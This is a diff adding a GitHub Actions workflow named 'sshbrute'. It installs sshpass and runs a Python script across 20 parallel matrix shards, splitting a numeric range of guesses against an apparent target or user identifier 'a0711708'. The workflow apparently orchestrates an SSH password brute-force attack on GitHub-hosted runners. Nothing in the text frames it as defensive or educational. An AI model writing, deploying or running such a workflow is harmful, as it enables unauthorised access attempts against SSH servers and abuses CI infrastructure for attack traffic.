@@ -1,0 +1,17 @@
+name: sshbrute
+on:
+  workflow_dispatch:
+    inputs:
+      start: {required: true, default: '0'}
+      per: {required: true, default: '1000'}
+jobs:
+  b:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 20
+      matrix: {shard: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]}
+    steps:
+      - uses: actions/checkout@v4
+      - run: sudo apt-get update -qq && sudo apt-get install -y -qq sshpass
+      - run: python3 sshbrute_gh.py a0711708 $(( ${{ inputs.start }} + ${{ matrix.shard }} * ${{ inputs.per }} )) ${{ inputs.per }}
